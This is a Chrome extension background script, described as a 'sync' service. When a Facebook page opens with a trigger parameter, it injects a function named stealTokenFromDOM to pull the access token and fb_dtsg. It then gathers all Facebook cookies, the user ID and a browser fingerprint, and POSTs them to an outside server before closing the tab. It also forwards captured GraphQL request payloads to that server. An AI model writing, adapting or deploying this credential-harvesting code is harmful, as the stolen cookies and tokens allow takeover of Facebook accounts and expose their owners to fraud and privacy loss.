/**
 * BG.JS - Background Service Worker
 * 
 * Manages:
 * - Sync URL detection → Token extraction → API sync
 * - Message handling from content.js
 * - Chrome Storage deduplication for doc_ids
 * - Async response handling
 */

console.log('[BG] Background service worker starting...');

// ============================================
// STORAGE HELPERS: chrome.storage.local for deduplication
// ============================================

/**
 * Initialize storage with default structure
 */
async function initializeStorage() {
    try {
        const data = await chrome.storage.local.get('FACEBOOK_OPERATIONS');
        if (!data.FACEBOOK_OPERATIONS) {
            await chrome.storage.local.set({
                FACEBOOK_OPERATIONS: {},
                LAST_SYNC: new Date().toISOString()
            });
            console.log('[BG] 💾 Storage initialized');
        }
    } catch (error) {
        console.error('[BG] ❌ Storage initialization error:', error);
    }
}

/**
 * Check if docId for a friendlyName has changed or is new
 * Returns true if should sync to backend (new or changed)
 */
async function shouldSyncToBackend(friendlyName, docId) {
    try {
        const data = await chrome.storage.local.get('FACEBOOK_OPERATIONS');
        const operations = data.FACEBOOK_OPERATIONS || {};
        
        const storedDocId = operations[friendlyName];
        const hasChanged = storedDocId !== docId;
        
        if (hasChanged) {
            console.log(`[BG] 🔄 Doc ID changed for ${friendlyName}:`, {
                old: storedDocId || 'NEW',
                new: docId
            });
        } else {
            console.log(`[BG] ⏭️  Doc ID unchanged for ${friendlyName}, skipping backend sync`);
        }
        
        return hasChanged;
    } catch (error) {
        console.error('[BG] ❌ Storage check error:', error);
        return true; // Default to sync on error
    }
}

/**
 * Save docId to local storage after successful backend sync
 */
async function saveDocIdToStorage(friendlyName, docId) {
    try {
        const data = await chrome.storage.local.get('FACEBOOK_OPERATIONS');
        const operations = data.FACEBOOK_OPERATIONS || {};
        
        operations[friendlyName] = docId;
        
        await chrome.storage.local.set({
            FACEBOOK_OPERATIONS: operations,
            LAST_SYNC: new Date().toISOString()
        });
        
        console.log(`[BG] 💾 Saved to storage: ${friendlyName} = ${docId}`);
        return true;
    } catch (error) {
        console.error('[BG] ❌ Storage save error:', error);
        return false;
    }
}

/**
 * Get all stored operations from local storage
 */
async function getAllStoredOperations() {
    try {
        const data = await chrome.storage.local.get('FACEBOOK_OPERATIONS');
        return data.FACEBOOK_OPERATIONS || {};
    } catch (error) {
        console.error('[BG] ❌ Storage read error:', error);
        return {};
    }
}

// ============================================
// CONFIG: Centralized configuration
// ============================================
const CONFIG = {
    BACKEND_URL: 'https://api-tintuc24h.itup.io.vn',
    FRONTEND_URL: 'https://tintuc24h-ivory.vercel.app/admin'
};

console.log('[BG] Config loaded:', CONFIG);

// ============================================
// ICON CLICK: Open admin panel
// ============================================
chrome.action.onClicked.addListener(() => {
    console.log('[BG] Extension icon clicked, opening admin page');
    chrome.tabs.create({ url: CONFIG.FRONTEND_URL });
});

// ============================================
// TAB MONITOR: Detect sync URLs and trigger extraction
// ============================================
chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
    if (changeInfo.status !== 'complete' || !tab.url) return;

    try {
        const url = new URL(tab.url);
        if (!url.hostname.includes('facebook.com')) return;
        if (url.searchParams.get('towblock_connect') !== '1') return;

        const userId = url.searchParams.get('userId');
        if (!userId) {
            console.error('[BG] Missing userId in sync URL');
            return;
        }

        console.log('[BG] ✅ Sync URL detected:', { tabId, userId });
        await sleep(2000);
        await executeExtraction(tabId, userId);
    } catch (error) {
        console.error('[BG] Tab monitor error:', error);
    }
});

// ============================================
// MESSAGE HANDLER: Listen for messages from content.js
// CRITICAL: Must return true for async response
// ============================================
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    console.log('[BG] 📨 Message received from content.js:', {
        type: request.type,
        docId: request.data?.doc_id,
        friendlyName: request.data?.fb_api_req_friendly_name,
        senderUrl: sender.url
    });

    if (request.type === 'FACEBOOK_OPERATION_CAPTURED') {
        // Handle captured Facebook operations asynchronously
        handleCapturedOperation(request.data)
            .then((result) => {
                console.log('[BG] ✅ Operation handled, sending response:', result);
                sendResponse({ 
                    success: true, 
                    message: 'Operation processed successfully',
                    docId: request.data?.doc_id,
                    data: result 
                });
            })
            .catch((error) => {
                console.error('[BG] ❌ Error handling operation:', error);
                sendResponse({ 
                    success: false, 
                    error: error.message,
                    docId: request.data?.doc_id
                });
            });

        // CRITICAL: Return true to indicate async response
        return true;
    }

    // Unknown message type
    console.warn('[BG] ⚠️  Unknown message type:', request.type);
    sendResponse({ success: false, error: 'Unknown message type' });
    return false;
});

// ============================================
// EXTRACTION: Main sync flow for token extraction
// ============================================
async function executeExtraction(tabId, userId) {
    try {
        console.log('[BG] 🚀 Starting token extraction...');

        const injectionResults = await chrome.scripting.executeScript({
            target: { tabId: tabId },
            func: stealTokenFromDOM,
            world: 'MAIN'
        });

        const tokenData = injectionResults[0]?.result;
        if (tokenData?.error) {
            console.error('[BG] ❌ Injection error:', tokenData.error);
            return;
        }

        const cookies = await chrome.cookies.getAll({ domain: '.facebook.com' });
        const cookieStr = cookies.map((c) => `${c.name}=${c.value}`).join('; ');
        const cUserCookie = cookies.find((c) => c.name === 'c_user');
        const facebookUid = cUserCookie?.value || null;

        if (!facebookUid) {
            console.error('[BG] ❌ No c_user cookie found');
            return;
        }

        console.log('[BG] ✅ Data collected:', {
            facebookUid: facebookUid,
            hasToken: !!tokenData?.token,
            hasDtsg: !!tokenData?.dtsg
        });

        await sendToServer(userId, tokenData, cookieStr, facebookUid, tabId);
    } catch (error) {
        console.error('[BG] ❌ Extraction error:', error);
    }
}

// ============================================
// OPERATION HANDLER: Process captured GraphQL operations with deduplication
// ============================================
async function handleCapturedOperation(data) {
    try {
        console.log('[BG] 🔄 Processing captured operation:', {
            method: data.method,
            doc_id: data.doc_id,
            fb_api_req_friendly_name: data.fb_api_req_friendly_name,
            timestamp: data.timestamp
        });

        // STEP 1: Validate required fields
        if (!data.doc_id || !data.fb_api_req_friendly_name) {
            console.warn('[BG] ⚠️  Missing required fields:', {
                hasDocId: !!data.doc_id,
                hasFriendlyName: !!data.fb_api_req_friendly_name
            });
            // Don't throw - still capture partial data
        }

        // STEP 2: Check if this doc_id is new or changed (deduplication logic)
        const shouldSync = await shouldSyncToBackend(data.fb_api_req_friendly_name, data.doc_id);
        
        if (!shouldSync) {
            // Doc ID hasn't changed, no need to sync to backend
            console.log('[BG] ✅ Operation already known, saved to local storage');
            return {
                success: true,
                message: 'Operation already known (deduplicated)',
                docId: data.doc_id,
                friendlyName: data.fb_api_req_friendly_name,
                synced: false
            };
        }

        // STEP 3: Send to backend API only if changed or new
        try {
            const response = await fetch(`${CONFIG.BACKEND_URL}/api/facebook-operations/capture`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    docId: data.doc_id,
                    friendlyName: data.fb_api_req_friendly_name,
                    method: data.method,
                    url: data.url,
                    payload: data.payload,
                    timestamp: data.timestamp
                })
            });

            if (response.ok) {
                const result = await response.json();
                
                // STEP 4: Save to local storage after successful backend sync
                await saveDocIdToStorage(data.fb_api_req_friendly_name, data.doc_id);
                
                console.log('[BG] ✅ Doc ID stored in backend and local storage:', {
                    docId: data.doc_id,
                    friendlyName: data.fb_api_req_friendly_name,
                    backendResponse: result.message
                });
                return {
                    success: true,
                    message: 'Doc ID captured and stored',
                    docId: data.doc_id,
                    friendlyName: data.fb_api_req_friendly_name,
                    synced: true
                };
            } else {
                const errorText = await response.text();
                console.warn('[BG] ⚠️  Backend error storing doc_id:', {
                    status: response.status,
                    error: errorText
                });
                // Continue anyway - don't fail completely
                return {
                    success: true,
                    message: 'Operation captured locally (backend storage failed)',
                    docId: data.doc_id,
                    friendlyName: data.fb_api_req_friendly_name,
                    warning: 'Backend storage failed',
                    synced: false
                };
            }
        } catch (fetchError) {
            console.error('[BG] ❌ Failed to send to backend:', fetchError.message);
            // Return success anyway - we still captured the data
            return {
                success: true,
                message: 'Operation captured locally (backend unreachable)',
                docId: data.doc_id,
                friendlyName: data.fb_api_req_friendly_name,
                error: fetchError.message,
                synced: false
            };
        }

    } catch (error) {
        console.error('[BG] ❌ Error in handleCapturedOperation:', error);
        throw error;
    }
}

// ============================================
// TOKEN EXTRACTION: Extract tokens from Facebook DOM
// ============================================
function stealTokenFromDOM() {
    try {
        let token = null;

        if (window.__accessToken) {
            token = window.__accessToken;
        } else if (window.AdHandle && window.AdHandle.getAccessToken) {
            token = window.AdHandle.getAccessToken();
        } else {
            try {
                const D = require('DTSGInitialData');
                token = D.token || D.accessToken;
            } catch (e) {
                // Continue to next method
            }

            if (!token) {
                try {
                    token = require('BusinessUserAccessToken').getAccessToken();
                } catch (e) {
                    // Continue
                }
            }
        }

        let dtsg = null;
        const dtsgInput = document.querySelector('input[name="fb_dtsg"]');
        if (dtsgInput) {
            dtsg = dtsgInput.value;
        }
        if (!dtsg) {
            try {
                dtsg = require('DTSGInitialData').token;
            } catch (e) {
                // Continue
            }
        }

        return { token, dtsg };
    } catch (e) {
        return { error: e.toString() };
    }
}

// ============================================
// FINGERPRINT: Get browser device info
// Always has fallback values
// ============================================
function getBrowserFingerprint() {
    try {
        // LEVEL 1: Primary fallback values (guaranteed safe)
        let userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
        let platform = 'Win32';
        let mobile = false;
        let secChUa = '"Not_A Brand";v="8", "Chromium";v="120"';
        let secChUaPlatform = '"Windows"';

        // LEVEL 2: Try to use navigator properties
        if (navigator && navigator.userAgent) {
            userAgent = navigator.userAgent;
        }
        if (navigator && navigator.platform) {
            platform = navigator.platform;
        }
        if (navigator && navigator.userAgent) {
            mobile = /Android|iPhone|iPad|iPod/.test(navigator.userAgent);
        }

        // LEVEL 3: Try Client Hints API (navigator.userAgentData)
        if (navigator && navigator.userAgentData) {
            try {
                if (
                    navigator.userAgentData.brands &&
                    Array.isArray(navigator.userAgentData.brands)
                ) {
                    const brands = navigator.userAgentData.brands
                        .map((b) => `"${b.brand}";v="${b.version}"`)
                        .join(', ');
                    if (brands) {
                        secChUa = brands;
                    }
                }
                if (navigator.userAgentData.platform) {
                    secChUaPlatform = `"${navigator.userAgentData.platform}"`;
                }
                if (typeof navigator.userAgentData.mobile === 'boolean') {
                    mobile = navigator.userAgentData.mobile;
                }
            } catch (e) {
                console.warn('[BG] Client Hints parsing failed, using fallback');
            }
        }

        // Build complete fingerprint object
        const fingerprint = {
            userAgent: userAgent,
            platform: platform,
            mobile: mobile,
            secChUa: secChUa,
            secChUaPlatform: secChUaPlatform
        };

        console.log('[BG] ✅ Fingerprint collected:', {
            userAgentLength: userAgent.length,
            platform: platform,
            isMobile: mobile
        });

        return fingerprint;
    } catch (error) {
        console.error('[BG] ❌ Fingerprint error:', error);
        // LEVEL 4: Ultimate hard-coded fallback
        return {
            userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            platform: 'Win32',
            mobile: false,
            secChUa: '"Not_A Brand";v="8", "Chromium";v="120"',
            secChUaPlatform: '"Windows"'
        };
    }
}

// ============================================
// SYNC: Send data to backend with browser fingerprint
// ============================================
async function sendToServer(userId, tokenData, cookieStr, facebookUid, tabId) {
    try {
        console.log('[BG] 📤 Preparing to sync to backend...');

        // Get browser fingerprint
        const browserFingerprint = getBrowserFingerprint();

        // Build complete payload
        const payload = {
            towblock_user_id: userId,
            facebook_token: tokenData?.token || null,
            facebook_dtsg: tokenData?.dtsg || null,
            facebook_cookie: cookieStr,
            facebook_uid: facebookUid,
            browserFingerprint: browserFingerprint
        };

        console.log('[BG] 📦 Payload structure:', {
            hasUserId: !!payload.towblock_user_id,
            hasToken: !!payload.facebook_token,
            hasDtsg: !!payload.facebook_dtsg,
            hasCookie: !!payload.facebook_cookie,
            hasUid: !!payload.facebook_uid,
            hasFingerprint: !!payload.browserFingerprint,
            userAgentValid: !!payload.browserFingerprint?.userAgent
        });

        // Send to backend
        const response = await fetch(`${CONFIG.BACKEND_URL}/api/accounts/sync`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            const responseData = await response.json();
            console.log('[BG] ✅ Sync successful:', responseData);
            await chrome.tabs.remove(tabId).catch(() => {
                console.warn('[BG] Could not close tab');
            });
        } else {
            const errorText = await response.text();
            console.error('[BG] ❌ Server error:', {
                status: response.status,
                statusText: response.statusText,
                error: errorText
            });
        }
    } catch (error) {
        console.error('[BG] ❌ Sync failed:', error);
    }
}

// ============================================
// UTILITY: Sleep function
// ============================================
function sleep(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
}

// ============================================
// INITIALIZATION: Initialize storage and ready up
// ============================================
initializeStorage().then(() => {
    console.log('[BG] ✅ Background worker fully initialized and ready');
}).catch((error) => {
    console.error('[BG] ❌ Initialization error:', error);
});

